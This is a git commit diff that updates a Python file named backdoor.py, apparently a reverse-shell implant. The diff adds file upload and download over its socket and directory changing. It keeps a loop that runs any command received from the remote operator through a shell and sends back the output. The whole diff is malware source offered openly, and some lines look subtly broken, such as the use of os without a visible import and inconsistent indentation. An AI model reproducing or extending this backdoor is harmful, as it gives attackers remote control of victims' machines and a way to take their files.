4a20ad27e18aeb9f0d4860efc68a565873ff8995
sk0r <97009398+skor21@users.noreply.github.com>
2023-01-06 22:21:42 +0000

    This is the updated version of backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -1,6 +1,7 @@
 import socket
 import time
 import subprocess
+import json
 
 def reliable_send(data):
         jsondata = json.dumps(data)
@@ -26,13 +27,37 @@ def conection ():
                except:
                 conection()
 
+def upload_file(file_name):
+   f = open(file_name, 'rb')
+   s.send(f.read())
+
+def download_file(file_name):
+   f = open(file_name, 'wb')
+   s.settimeout(1)
+   chunk = s.recv(1024)
+   while chunk:
+           f.write(chunk)
+           try:
+                   chunk = s.recv(1024)
+           except socket.timeout as e:
+                  break
+    s.settimeout(None)
+    f.close()
 
 def shell():
         while True:
                 command = reliable_recv()
                 if command == 'quit' :
                         break
-                else:
+                elif command == 'clear':
+                        pass
+                elif command[:3] == 'cd ':
+                   os.chdir(command[3:])
+                elif command[:8] == 'download':
+                   upload_file(command[9:])
+                elif command[:6] == 'upload':
+                     download_file(command[7:])
+                else: 
                         execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         result = execute.stdout.read() + execute.stderr.read()
                         result = result.decode()
